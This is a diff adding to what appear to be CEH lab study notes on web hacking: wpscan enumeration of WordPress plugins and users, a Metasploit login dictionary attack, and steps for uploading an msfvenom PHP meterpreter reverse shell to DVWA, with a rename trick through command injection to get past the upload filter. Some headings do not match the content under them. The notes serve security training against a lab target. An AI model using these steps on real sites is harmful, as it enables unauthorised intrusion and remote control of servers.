@@ -91,6 +91,33 @@ Other tools:
 
 ### Parameter Tampering by Brup Suite
   
+  "Proxy" tab -> "Intercept" -> "Params"
   
-
+### XSS Vulnerabilities
   
+###  Cross-site Request Forgery (CSRF) Attack
+  ``` wpscan --api-token [API Token from Step#25] --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate vp ```\
+  --enumerate vp: specifies the enumeration of vulnerable plugins.
+  
+### WPScan and Metasploit
+  ``` wpscan --api-token [API Token] --url http://10.10.10.16:8080/CEH --enumerate u ```\
+  --enumerate u: specifies the enumeration of usernames.
+   
+   auxiliary module called **wordpress_login_enum** (in **msfconsole**) to perform a dictionary attack using the password.txt 
+  
+### Remote Command Execution Vulnerability
+  
+  Damn Vulnerable Web App (DVWA) [link](https://dvwa.co.uk/)\
+  The "Command Injection" tab.
+  
+### File Upload Vulnerability
+  
+  1. ``` msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw ```
+  2. copy the raw payload to a file.
+  3. in DVWA`s "File Upload" panel, upload the raw file.
+  4. In msfconsole, type use exploit/multi/handler 
+  5. Browse the uploaded file`s path, like "http://10.10.10.16:8080/dvwa/hackable/uploads/upload.php"
+  
+  If security level is high, we can upload payload.jpg to the server. Then use Command Injection to change the file name to payload.php on the server side. Then the same.
+  
+### Gain Backdoor Access via a Web Shell using Weevely
